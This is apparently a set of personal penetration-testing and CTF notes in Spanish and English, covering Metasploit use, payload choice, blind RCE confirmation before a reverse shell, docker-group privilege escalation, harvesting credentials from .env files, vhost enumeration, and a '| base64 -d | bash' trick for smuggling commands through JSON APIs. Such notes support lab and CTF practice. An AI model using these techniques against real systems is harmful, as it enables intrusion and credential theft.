- **Metasploit:** `db_nmap` siempre dentro de msfconsole. `set verbose true` muestra output que de otra forma se oculta.
- **Target selection:** In-memory payloads para containers, droppers para filesystem con permisos.
- **Non-fatal errors:** Aparición de errores durante el exploit no significa fallo — esperar el output completo.
- **RCE sin output:** Confirmar con pingback + tcpdump antes de intentar reverse shell.
- **Grupos no estándar:** En CTFs un grupo no estándar (`operator`) siempre es intencional — investigar (`newgrp`/`sg`).
- **docker group = root:** No es un exploit — es abuso de funcionalidad legítima.
- **`/var/www/html/.env` y config files:** Siempre revisarlos — credenciales de BD suelen reutilizarse como credenciales de sistema.
- **Virtual hosting:** Siempre enumerar vhosts — los subdominios esconden superficie de ataque.
- **base64 en JSON:** Para payloads con caracteres especiales en APIs JSON, encodar en base64 y decodificar con `| base64 -d | bash`.